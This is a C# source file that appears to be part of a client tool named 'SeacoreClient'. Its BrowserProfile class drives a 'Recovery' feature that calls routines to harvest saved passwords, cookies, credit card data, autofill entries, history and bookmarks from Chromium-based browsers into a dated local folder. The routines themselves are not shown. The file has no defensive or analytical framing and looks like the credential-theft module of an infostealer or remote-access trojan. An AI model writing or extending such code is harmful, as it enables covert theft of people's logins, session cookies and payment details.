using SeacoreClient.Features.Recovery.Browsers.Chromium;
using SeacoreClient.Features.Recovery.Utilities;

namespace SeacoreClient.Features.Recovery.Browsers
{
    public class BrowserProfile
    {
        private readonly string _browserName;
        private readonly string _relativeSearchPath;
        private readonly string _recoveryPath;
        private readonly bool _dataFound = false;

        public BrowserProfile(string browserName, string relativeSearchPath)
        {
            _browserName = browserName;
            _relativeSearchPath = relativeSearchPath;
            _recoveryPath = Path.Combine("Recovery", _browserName, UtilitiesCommon.GetDateTimeFolder());
        }

        public void EnsureDirectory()
        {
            if (_dataFound && !Directory.Exists(_recoveryPath))
            {
                Directory.CreateDirectory(_recoveryPath);
            }
        }

        public void RecoverData()
        {
            ChromiumPasswords.Recover(_browserName, _relativeSearchPath);
            ChromiumBookmarks.Recover(_browserName, _relativeSearchPath);
            ChromiumHistory.Recover(_browserName, _relativeSearchPath);
            ChromiumCreditCards.Recover(_browserName, _relativeSearchPath);
            ChromiumAutofill.Recover(_browserName, _relativeSearchPath);
            ChromiumCookies.Recover(_browserName, _relativeSearchPath);
        }
    }
}
